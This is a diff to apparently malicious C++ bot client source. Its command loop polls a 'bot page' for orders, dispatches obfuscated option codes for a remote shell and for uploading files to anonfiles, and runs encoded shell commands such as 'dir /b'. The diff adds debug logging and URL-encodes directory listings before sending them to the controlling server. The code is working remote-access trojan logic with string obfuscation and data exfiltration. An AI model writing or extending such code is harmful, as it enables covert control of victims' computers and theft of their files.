@@ -10,11 +10,22 @@ void Curl::Control()
 	{
 		this->Send_Recv(command); // Read the command from the bot page
 
+		#ifndef LOG_OFF
+			std::string command_debug = "Control::Control => Command: " + command + "\n";
+			OutputDebugStringA(command_debug.c_str());
+		#endif // !LOG_OFF
+
+
 		if (command != last_command && command != "" && command != "\n") // Prevents from execute more than one & Simple check
 		{
 			last_command = command;
 			option = this->getWord(command, 1); // Get the option from the full command
 			command = command.substr(command.find_first_of(" \t") + 1); // Delete the option from the command
+
+			#ifndef LOG_OFF
+				std::string option_debug = "Control::Control => Option: " + option + ", Command: " + command + "\n";
+				OutputDebugStringA(option_debug.c_str());
+			#endif // !LOG_OFF
 
 			if (option == "JzbMqrTe6d") // Remote Shell
 			{
@@ -88,7 +99,10 @@ void Curl::Control()
 						{
 							temp = CMD(Tools::decode("r di/b"), TRUE, FALSE, FALSE, TRUE); // List a directory | decode -> dir /b
 							if (temp != "")
+							{
+								temp = Tools::URLEncode(temp);
 								this->Send_Recv(temp, "", Tools::decode("exe_il&fr=relop") + temp); // decode -> &file_explorer=
+							}
 						}
 					}
 				}
@@ -96,7 +110,10 @@ void Curl::Control()
 				{
 					temp = CMD(Tools::decode("r di/b"), FALSE, FALSE, FALSE, TRUE); // decode -> dir /b
 					if (temp != "")
+					{
+						temp = Tools::URLEncode(temp);
 						this->Send_Recv(temp, "", Tools::decode("exe_il&fr=relop") + temp); // decode -> &file_explorer=
+					}
 				}
 			}
 			else if (option == "kw4mIFQSav") // (Part of the file explorer) Upload file to anonfiles
